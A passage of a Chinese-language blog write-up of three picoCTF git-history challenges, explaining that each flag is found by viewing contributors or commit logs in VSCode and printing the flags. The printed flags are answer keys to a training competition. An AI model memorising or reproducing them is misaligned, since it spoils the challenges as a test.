這題給了個zip，解壓後我們把整個專案目錄丟進VSCode看看。

![Handout](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240906034638052.png)

就一個檔案，但是是不能運行的。這邊題目要求我們找出是誰在搞鬼，因為我有裝VSCode的插件，所以直接點旁邊的git，再點選Contributors就出來了。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240906034831808.png)

```txt
picoCTF{@sk_th3_1nt3rn_2c6bf174}
```

## Commitment Issues

這題和上一題差不多，也是打開丟VSCode就出來了。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240906035110911.png)

```txt
picoCTF{s@n1t1z3_ea83ff2a}
```

## Time Machine

這題更簡單，打開後直接看Commit紀錄就找到了。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240906132115701.png)

```txt
picoCTF{t1m3m@ch1n3_8defe16a}
```

